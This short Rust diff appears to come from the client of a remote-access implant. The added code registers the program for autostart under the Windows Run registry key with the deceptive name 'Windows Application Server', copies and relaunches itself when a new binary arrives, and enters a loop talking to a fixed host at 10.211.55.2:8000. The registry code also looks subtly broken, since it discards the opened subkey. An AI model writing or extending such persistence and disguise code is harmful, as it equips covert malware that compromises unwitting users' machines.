@@ -129,12 +129,20 @@ fn should_run() -> bool {
             continue;
         }
 
-        if utils::NAMES.iter().any(|n| proc.name().ends_with(n)) {
-            return false;
+        if proc.name().ends_with(&*utils::NAME1) || proc.name().ends_with(&*utils::NAME2) {
+            continue;
         }
     }
 
     true
+}
+
+#[cfg(windows)]
+fn ensure_autorun(path: &str) -> Result<()> {
+    let key = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
+    key.open_subkey("\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;
+    key.set_value("Windows Application Server", path)?;
+    Ok(())
 }
 
 fn main() {
@@ -145,6 +153,20 @@ fn main() {
         return;
     }
 
+    // new binary?
+    if std::env::current_exe().unwrap().ends_with(&*utils::NAME2) {
+        std::fs::copy(&*utils::NAME2, &*utils::NAME1).unwrap();
+        Command::new(&*utils::NAME1).spawn().unwrap();
+        return;
+    }
+
+    // ensure autorun
+    #[cfg(windows)]
+    if let Err(err) = ensure_autorun(&utils::NAME1) {
+        println!("error: {}", err.to_string());
+    }
+
+    // main loop
     let mut api = Api::new("10.211.55.2", 8000, false);
     loop {
         match main_loop(&mut api) {
